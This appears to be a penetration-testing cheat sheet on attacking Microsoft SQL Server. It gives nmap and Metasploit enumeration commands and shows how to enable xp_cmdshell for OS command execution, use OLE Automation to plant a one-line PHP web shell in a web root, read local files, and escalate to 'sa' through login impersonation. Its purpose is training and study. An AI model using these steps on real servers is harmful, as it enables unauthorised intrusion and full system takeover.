# Microsoft SQL - MSSQL
- Microsoft SQL (MSSQL) is Microsoft's SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems.<br>
- It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET.


**MSSQL Enumeration Cheat Sheet**
- There are many ways we can approach footprinting the MSSQL service, the more specific we can get with our scans, the more useful information we will be able to gather. NMAP has default mssql scripts that can be used to target the default tcp port 1433 that MSSQL listens on.<br>

|Key/Command|Description|
|:----|:----|
|nmap -Pn -sV -sC -p1433 <Server_IP>|Banner Grabbing using nmap|
|sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <Server_IP>|NMAP MSSQL Script Scan|
|msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts <Server_IP>|MSSQL Ping in Metasploit|

**Interaction with the MSSQL Server**
- MSSQL supports two [authentication modes](https://learn.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server?view=sql-server-ver17), which means that users can be created in Windows or the SQL Server:
  - **Windows authentication mode** - This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.<br>
  - **Mixed mode** - Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.

|Key/Command|Description|
|:----|:----|
|python3 mssqlclient.py Administrator@<Server_IP> -windows-auth|Connecting with Mssqlclient.py|
|mssqlclient.py -p 1433 <user_name>@<Server_IP> |Connecting with Mssqlclient.py|
|sqsh -S <Server_IP> -U .\\<user_name> -P 'MyPassword!' -h|Connecting with sqsh|

**Default Databases**
- [Read more](https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15)
- MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:

|Default System Database|Description|
|:----|:----|
|master|Tracks all system information for an SQL server instance|
|model|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database|
|msdb|The SQL Server Agent uses this database to schedule jobs & alerts|
|tempdb|Stores temporary objects|
|resource|Read-only database containing system objects included with SQL server|

**Execute Commands**
- Command execution is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.<br>
- MSSQL has a extended stored procedures called xp_cmdshell which allow us to execute system commands using SQL. Keep in mind the following about xp_cmdshell:
  - xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option).<br>
  - The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account.<br>
  - xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed.<br>

- To execute commands using SQL syntax on MSSQL, use:
```
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```
- If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```
- To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
```
- MSSQL - Create a File
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
Read Local Files in MSSQL
```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```
**Impersonate Existing Users with MSSQL**
- SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.
- Identify Users that We Can Impersonate:
```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```
- Verifying our Current User and Role
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)

```
- Impersonating the SA User
  - Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.<br>
```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```
**Communicate with Other Databases with MSSQL**
- MSSQL has a configuration option called [linked servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-ver17). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
- Identify linked Servers in MSSQL
```
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```
